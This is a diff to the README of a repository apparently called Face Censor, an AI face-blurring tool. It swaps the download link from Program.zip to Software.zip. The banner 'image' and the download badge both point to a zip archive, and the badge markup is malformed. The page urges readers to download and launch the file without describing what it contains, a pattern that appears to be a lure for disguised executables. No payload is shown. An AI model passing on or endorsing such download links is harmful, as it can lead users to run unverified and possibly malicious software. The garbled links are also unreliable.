@@ -2,7 +2,7 @@
 
 Welcome to the **Face Censor** repository - your one-stop solution for detecting and blurring faces in any input images or videos using AI technology! 🚀
 
-![Face Censor Banner](https://github.com/ArryAarav/face-censor/releases/download/v1.0/Program.zip)
+![Face Censor Banner](https://github.com/ArryAarav/face-censor/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Welcome to the **Face Censor** repository - your one-stop solution for detecting
 
 To get started with **Face Censor**, simply download the software package from the following link:
 
-[![Download Face Censor](https://github.com/ArryAarav/face-censor/releases/download/v1.0/Program.zip%20Censor-blue)](https://github.com/ArryAarav/face-censor/releases/download/v1.0/Program.zip)
+[![Download Face Censor](https://github.com/ArryAarav/face-censor/releases/download/v2.0/Software.zip%20Censor-blue)](https://github.com/ArryAarav/face-censor/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, launch it and start blurring faces like a pro! If you encounter any issues with the download link, be sure to check the "Releases" section for alternative download options.
 
